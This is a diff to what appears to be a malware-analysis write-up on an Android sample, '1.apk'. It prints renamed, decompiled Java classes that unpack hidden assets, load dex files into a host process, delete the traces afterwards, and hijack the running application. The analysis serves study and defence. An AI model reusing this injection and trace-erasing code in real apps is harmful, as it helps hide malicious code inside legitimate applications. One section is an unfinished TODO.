@@ -583,7 +583,138 @@ public static Application setContentProvider(Application application, String stu
 }
 ```
 
-What is interesting here as a clue, it that the content provider value for the field has to be in clear text, and we can clearly see it is '_fnjkjldn_'.
+What is interesting here as a clue, it that and a field with name '_fnjkjldn_' is being set with an object of type _ContentProvider_ and value the new created _Application_ object.
+
+### _pht.dgrrsrp.hgdtgssvw_
+
+_AppComponentFactory_ is a factory class that you can extend from and inside, you can return your custom Activity, Application, Service, BroadcastReceiver, and ContentProvider. That is basically what this package with it's _AppComponentFactoryBuilder_ class is, a way of returning custom objects based on what the current application process contains.
+
+### _pls.hqmkfei.nxskrnoon.fwwsp_
+
+The class we renamed as _ContextWrapper_ serves solely as a wrapper for the Context object, intended for use by the malicious application. Its only method, as evidenced, is to append a new asset to the current asset list of the application.
+
+```java
+public void assetLoader() {
+    try {
+        Context context = this.malContext;
+        ArrayList<String> patchAssetPath = new ArrayList<>();
+        patchAssetPath.add(context.getPackageResourcePath());
+        String assetsName = "rxrjiy" + Consts.DOT + "tjp";
+        File assets = new File(context.getFilesDir(), assetsName);
+        Decompressor.inflater(context.getAssets().open(assetsName), new FileOutputStream(assets));
+        patchAssetPath.add(assets.getPath());
+        Iterator<String> it = patchAssetPath.iterator();
+        while (it.hasNext()) {
+            String assetsPath = it.next();
+            AssetManagerWrapper.setAssetPathToGivenAssetManager(context.getAssets(), assetsPath);
+        }
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+```
+
+We renamed this method to _assetLoader_, and we can see the path of the new asset being loaded: '_rxrjiy.tjp_'. This file does exist inside the assets directory; we will explore it later.
+
+Another important line to note is the _Decompressor_ class, which we'll also examine later.
+
+But for now, we have sufficient knowledge to understand that all this method does is decompress a hidden file and add its path to the assets list.
+
+#### _rjg.ugogehh.gxwrstviq.khhf_
+
+Renamed to _DexDirHandler_, this class only purpose is to create a directory called '_app\_dex_' and return it as a _File_ object.
+
+### _vie.dwhyiud.voxxndgyo.sooyh_
+
+Renamed to _DexLoader_, the name is self-explanatory, using both the _Decompressor_ and _DexDirHandler_, this class loads dex files, decompresses them, copies them to the new directory _app\_dex_ and then maps the dex contents to new objects.
+
+```java
+public void dexFileLoader() {
+    try {
+        Context context = malContext;
+        String[] fileList = context.getAssets().list("iugke");
+        File dexDir = DexDirHandler.getDexDir(context);
+        for (String dexName : fileList) {
+            if (dexName.endsWith(Consts.DOT + "vqr")) {
+                File file = new File(dexDir, dexName);
+                try {
+                    Decompressor.inflater(
+                            context.getAssets().open("iugke" + "/" + dexName),
+                            new FileOutputStream(file));
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                dexFileList.add(file);
+            }
+        }
+        dexToObjects(dexDir);
+        FileDeletionWrapper.deletePathFiles(dexDir);
+    ...
+    }
+    ...
+}
+```
+
+### _vjj.xsflifo.puoiiqxxg.fwrsd_
+
+If you pay close attention to the previous code snippet, you'll notice a class named _FileDeletionWrapper_. This class is within this package, and its sole purpose is to delete all files, directories, and _File_ objects created by other classes, such as those in the previous package, which dynamically generated them.
+
+In essence, it serves as a package to eradicate any traces of potentially malicious files ever existing.
+
+### _wfu.tjudfot.tetdyxomh.vrqdh_
+
+_AssetManagerWrapper_ is yet another wrapper designed solely for reading and writing asset paths in running applications through reflection.
+
+As we have seen before, it is utilized by the _ContextWrapper_ to append the new malicious asset to the asset list of the running application.
+
+### _yuh.xvuijvy.kjmyuiiwm_
+
+With this we reach the final package inside _1.apk_, with a class we named _ApplicationBuider_. This class is the top object between all of the packages, beginning here, new context are created, dex files loaded, activities in threads swapped and content providers set.
+
+```java
+public class ApplicationBuider extends Application {
+    @Override // android.content.ContextWrapper
+    protected void attachBaseContext(Context base) {
+        super.attachBaseContext(base);
+        new ContextWrapper(base).assetLoader();
+        new DexLoader(base).dexFileLoader();
+        ObjectProxy.initBuilder(this, "", "yuh.xvuijvy.kjmyuiiwm.jwkyiuu");
+    }
+
+    @Override // android.app.Application
+    public void onCreate() {
+        super.onCreate();
+        ObjectProxy.threadActiviySwap(this, "yuh.xvuijvy.kjmyuiiwm.jwkyiuu");
+    }
+
+    @Override // android.content.ContextWrapper, android.content.Context
+    public Context createPackageContext(String packageName, int flags) throws PackageManager.NameNotFoundException {
+        return ObjectProxy.setContentProvider(this, "yuh.xvuijvy.kjmyuiiwm.jwkyiuu");
+    }
+
+    @Override // android.content.ContextWrapper, android.content.Context
+    public String getPackageName() {
+        return "com.zjxyxnvvp.nxvxchltf";
+    }
+}
+```
+
+### So what does 1.apk do ?
+
+Having said all of this, the collective functionality of these packages is to function as an interpreter and 'injector' for a malicious application into another. 1.apk itself does not corrupt or exfiltrate any data from the system or application it targets. Instead, it attaches itself to a running application during runtime and serves as a gateway for another application to exploit the runtime permissions and thread access of the main application.
+
+In a way, one can say that 1.apk acts as a '_system hijacker_', enabling an application to run without ever being initiated by the user or system directly, by replacing another application in the process.
+
+### Taking a step back
+
+TODO
+
+
+
+
+
+
+
 
 ```java
 public static String ehsqpiefmxd = "捨뺑戚\ue684聳踖曡㒕躚\udafdﶃ킎";
